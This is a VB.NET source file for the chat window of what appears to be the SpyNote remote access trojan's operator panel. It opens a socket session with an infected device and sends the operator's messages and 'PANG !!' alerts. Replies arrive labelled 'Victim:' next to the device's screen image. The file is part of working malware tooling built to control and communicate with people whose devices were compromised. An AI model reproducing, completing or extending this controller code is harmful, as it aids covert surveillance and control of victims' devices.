Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Globalization
Imports System.IO
Imports System.Media
Imports System.Threading
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class Chat
    Public TClient As SocketClient

    Public MyName As String

    Private BActivated As Boolean

    Private bit0 As Bitmap

    Private bit1 As Bitmap

    Private bit2 As Bitmap

    Private bitLap As Bitmap

    Public aMedia As SoundPlayer

    Private x As Integer

    Private y As Integer

    Private TRowCount As Integer

    Private int As Integer
    Public Sub New()
        Me.MyName = "-1"
        Me.TRowCount = 0
        Me.int = 0
        Me.InitializeComponent()
    End Sub

    Private Sub Chat_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(33)), Data.SplitData, "/exit/chat/", Data.SplitData, "?"}))
    End Sub

    Private Sub Chat_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\11.ico"))
        Me.TextChat.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.ViewManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        If (File.Exists(String.Concat(Store.Resources(1), "\Audio\c.wav"))) Then
            Try
                Me.aMedia = New SoundPlayer() With
                {
                    .SoundLocation = String.Concat(Store.Resources(1), "\Audio\c.wav")
                }
                Me.aMedia.Load()
            Catch exception As System.Exception
            End Try
        End If
        Me.Label1.Text = Strings.Space(1)
        Me.bit0 = New Bitmap(Store.Bitmap_0("Chat\c0"))
        Me.bit1 = New Bitmap(Store.Bitmap_0("Chat\c1"))
        Me.bit2 = New Bitmap(17, 17)
        Me.bitLap = New Bitmap(Store.Bitmap_0("Chat\lap"))
        Me.ThemeChDown1.ImageChoice = Store.Bitmap_0("Chat\Cdown")
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub
    Private Sub GF_Activated(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Activated
        Me.BActivated = True
    End Sub

    Private Sub GF_Deactivate(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Deactivate
        Me.BActivated = False
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.ViewManager.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.ViewManager.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.ViewManager.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
            Dim flag6 As Boolean = num > Me.ViewManager.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                    Me.ThemeChDown1._Countt = 0
                    Dim flag9 As Boolean = Me.ThemeChDown1.Visible > False
                    If flag9 Then
                        Me.ThemeChDown1.Visible = False
                    End If
                End If
            End If
        Else
            Dim flag10 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag10 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
                Me.ThemeChDown1._Countt = 0
                Dim flag11 As Boolean = Me.ThemeChDown1.Visible > False
                If flag11 Then
                    Me.ThemeChDown1.Visible = False
                End If
            End If
        End If
    End Sub
    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
                If (Me.TRowCount = -1) Then
                    Me.ToEndViewManager()
                    Me.TRowCount = 0
                End If
            End SyncLock
        End If
    End Sub

    Private Sub STALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles STALAB.Click
        Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
        Dim str As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
        Me.ViewManager.Rows.Add(New Object() {Me.bitLap, "ME:", "PANG !!", str, Me.bit0})
        Dim count As Integer = Me.ViewManager.Rows.Count - 1
        Me.ViewManager.Rows(count).Cells(2).Style.ForeColor = Color.FromArgb(255, 255, 92, 94)
        Me.ViewManager.Rows(count).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 255, 92, 94)
        Me.ViewManager.Rows(count).Cells(1).Style.ForeColor = Color.FromArgb(255, 1, 174, 240)
        Me.ViewManager.Rows(count).Cells(1).Style.SelectionForeColor = Color.FromArgb(255, 1, 174, 240)
        Me.ViewManager.Rows(count).Cells(3).Style.ForeColor = Color.FromArgb(255, 100, 100, 100)
        Me.ViewManager.Rows(count).Cells(3).Style.SelectionForeColor = Color.FromArgb(255, 100, 100, 100)
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(33)), Data.SplitData, "PANG !!", Data.SplitData, count.ToString()}))
        If (Operators.ConditionalCompareObjectEqual(Me.ThemeChDown1.Tag, -1, False)) Then
            Me.TRowCount = -1
        End If
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, "write", False) = 0) Then
                Dim flag As Boolean = If(Operators.CompareString(Ay.GetValue(1).ToString(), "null", False) = 0, False, True)
                Me.Twrite.Tag = If(flag, String.Concat("Write: ", Ay.GetValue(1).ToString()), "\<\^\*?>")
                Me.Twrite.Enabled = True
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) <> 0) Then
                If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) <> 0) Then
                    If (Operators.CompareString(value, "OK", False) = 0) Then
                        Try
                            Me.ViewManager.Rows(Conversions.ToInteger(Ay.GetValue(1).ToString())).Cells(4).Value = Me.bit1
                        Catch exception As System.Exception
                        End Try
                    ElseIf (Operators.CompareString(value, "Client:", False) = 0) Then
                        Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                        Dim str As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                        Me.ViewManager.Rows.Add(New Object() {Me.TClient.Screen, "Victim:", Ay.GetValue(1).ToString(), str, Me.bit2})
                        Dim count As Integer = Me.ViewManager.Rows.Count - 1
                        Me.ViewManager.Rows(count).Cells(2).Style.ForeColor = Color.FromArgb(255, 215, 215, 215)
                        Me.ViewManager.Rows(count).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 215, 215, 215)
                        Me.ViewManager.Rows(count).Cells(1).Style.ForeColor = Color.FromArgb(255, 252, 200, 134)
                        Me.ViewManager.Rows(count).Cells(1).Style.SelectionForeColor = Color.FromArgb(255, 252, 200, 134)
                        Me.ViewManager.Rows(count).Cells(3).Style.ForeColor = Color.FromArgb(255, 100, 100, 100)
                        Me.ViewManager.Rows(count).Cells(3).Style.SelectionForeColor = Color.FromArgb(255, 100, 100, 100)
                        If (Not Me.VisualStudioVerticalScrollBar1.Visible) Then
                            Me.ThemeChDown1._Countt = 0
                        Else
                            Dim themeChDown1 As ThemeChDown = Me.ThemeChDown1
                            themeChDown1._Countt = themeChDown1._Countt + 1
                        End If
                        If (Operators.ConditionalCompareObjectEqual(Me.ThemeChDown1.Tag, -1, False)) Then
                            Me.TRowCount = -1
                        ElseIf (Me.VisualStudioVerticalScrollBar1.Visible) Then
                            If (Not Me.ThemeChDown1.Visible) Then
                                Me.ThemeChDown1.Visible = True
                            End If
                        End If
                        If (Not Me.BActivated) Then
                            If (Operators.CompareString(Data.OptionsLines(6), "OK", False) = 0) Then
                                Try
                                    If (Me.aMedia.IsLoadCompleted) Then
                                        Me.aMedia.Play()
                                    End If
                                Catch exception1 As System.Exception
                                End Try
                            End If
                            Try
                                Dim handle As IntPtr = MyBase.Handle
                                WindowsApi.FlashWindow(handle, True, True, 5)
                            Catch exception2 As System.Exception
                            End Try
                        End If
                    End If
                End If
            End If
        Catch exception3 As System.Exception
        End Try
    End Sub

    Private Sub TextChat_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles TextChat.KeyDown
        If (e.KeyCode = Keys.[Return]) Then
            Me.TextChat.Text = Me.TextChat.Text.Replace("" & vbCrLf & "", "").Trim()
            If (CObj(Me.TextChat.Text.Trim()) <> CObj("")) Then
                Thread.CurrentThread.CurrentCulture = New CultureInfo("en-US")
                Dim str As String = DateAndTime.TimeOfDay.ToString("h:mm:ss tt")
                Me.ViewManager.Rows.Add(New Object() {Me.bitLap, "ME:", Me.TextChat.Text.Trim(), str, Me.bit0})
                Dim count As Integer = Me.ViewManager.Rows.Count - 1
                Me.ViewManager.Rows(count).Cells(2).Style.ForeColor = Color.FromArgb(255, 215, 215, 215)
                Me.ViewManager.Rows(count).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 215, 215, 215)
                Me.ViewManager.Rows(count).Cells(1).Style.ForeColor = Color.FromArgb(255, 1, 174, 240)
                Me.ViewManager.Rows(count).Cells(1).Style.SelectionForeColor = Color.FromArgb(255, 1, 174, 240)
                Me.ViewManager.Rows(count).Cells(3).Style.ForeColor = Color.FromArgb(255, 100, 100, 100)
                Me.ViewManager.Rows(count).Cells(3).Style.SelectionForeColor = Color.FromArgb(255, 100, 100, 100)
                Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(33)), Data.SplitData, Me.TextChat.Text.Trim(), Data.SplitData, count.ToString()}))
                Me.TextChat.Text = Nothing
            End If
            If (Operators.ConditionalCompareObjectEqual(Me.ThemeChDown1.Tag, -1, False)) Then
                Me.TRowCount = -1
            End If
        End If
    End Sub
    Private Sub ThemeChDown1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeChDown1.Click
        Me.TRowCount = -1
        Me.ThemeChDown1.Tag = -1
    End Sub

    Private Sub ToEndViewManager()
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
                Me.ViewManager.CurrentCell = Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(1)
                Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Selected = True
                Me.ThemeChDown1._Countt = 0
                If (Me.ThemeChDown1.Visible) Then
                    Me.ThemeChDown1.Visible = False
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(79)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub
    Private Sub Twrite_Tick(sender As Object, e As EventArgs) Handles Twrite.Tick
        Me.int += 1
        Dim right As String = Nothing
        Dim num As Integer = Me.int
        Dim flag As Boolean = num >= 0 AndAlso num <= 5
        If flag Then
            right = "."
        Else
            flag = (num >= 6 AndAlso num <= 11)
            If flag Then
                right = ".."
            Else
                flag = (num >= 12 AndAlso num <= 16)
                If flag Then
                    right = "..."
                Else
                    flag = (num >= 16)
                    If flag Then
                        Me.int = 0
                    End If
                End If
            End If
        End If
        Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(Me.Twrite.Tag, "\<\^\*?>", False)
        If flag2 Then
            Me.Label1.Text = Strings.Space(1)
            Me.Twrite.Enabled = False
        Else
            Me.Label1.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Me.Twrite.Tag, Strings.Space(1)), right))
        End If
    End Sub
    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
            ProjectData.ClearProjectError()
        End Try
        Dim maximum As Integer = Me.VisualStudioVerticalScrollBar1.Maximum
        Dim value As Integer = Me.VisualStudioVerticalScrollBar1.Value
        If (Not (value + 1 = maximum Or value = maximum)) Then
            Me.ThemeChDown1.Tag = 0
        Else
            Me.ThemeChDown1._Countt = 0
            If (Me.ThemeChDown1.Visible) Then
                Me.ThemeChDown1.Visible = False
            End If
            Me.ThemeChDown1.Tag = -1
        End If
    End Sub
End Class